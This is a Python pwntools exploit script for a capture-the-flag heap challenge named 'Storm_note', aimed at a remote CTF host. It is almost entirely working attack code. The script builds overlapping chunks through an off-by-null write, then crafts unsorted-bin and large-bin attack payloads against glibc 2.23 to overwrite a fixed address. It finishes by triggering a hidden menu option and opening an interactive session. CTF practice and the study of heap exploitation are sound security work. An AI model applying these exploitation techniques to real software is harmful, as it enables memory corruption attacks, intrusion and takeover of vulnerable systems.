from pwn import *
context.arch = 'amd64'
host = 'ctf3.linkedbyx.com'
port = 11024
elf = ELF('./Storm_note')
libc = ELF('libc-2.23.so')
#io = process('./Storm_note')
io = remote(host,port)
def choice(c):
	io.sendlineafter('Choice: ',str(c))
def alloc(size):
	choice(1)
	io.sendlineafter('size ?\n',str(size))
def update(index,data):
	choice(2)
	io.sendlineafter('Index ?\n',str(index))
	io.sendafter('Content: ',data)
def delete(index):
	choice(3)
	io.sendlineafter('Index ?\n',str(index))

list_base = 0xabcd0100

alloc(0x18)		#0
alloc(0x508)	#1
alloc(0x18)		#2

alloc(0x18)		#3
alloc(0x508)	#4
alloc(0x18)		#5

alloc(0x18)		#6

update(1,0x4f0*'\x00'+p64(0x500))
delete(1)
update(0,0x18*'\x00')
alloc(0x18)		#1
alloc(0x4d8)	#7
delete(1)
delete(2)		#control 7
alloc(0x30)		#1
alloc(0x4e8) #2

update(4,0x4f0*'\x00'+p64(0x500))
delete(4)
update(3,0x18*'\x00')
alloc(0x18)		#4
alloc(0x4d8)	#8
delete(4)
delete(5)
alloc(0x40)		#4 0x5c0 -> unsorted
#why more than 0x30? cause alloc 0x40 makes another chunk 0x4d0(differ from 2) and this 0x4d0 should finally be put in large bins
delete(2)		# 0x060 -> unsorted
alloc(0x4e8)	#2 0x060 -> used && 0x5c0 -> large
delete(2) # 0x060 -> unsorted

uba_pay = 3*p64(0)+p64(0x4f1)+p64(0)+p64(list_base-0x20)
update(7,uba_pay)

lba_pay = 5*p64(0)+p64(0x4e1)+p64(0)+p64(list_base-0x18)+p64(0)+p64(list_base-0x38-5)
update(8,lba_pay)

alloc(0x48)	#2
update(2,'a'*0x47)

choice(666)
io.sendline('a'*0x30)
io.interactive()
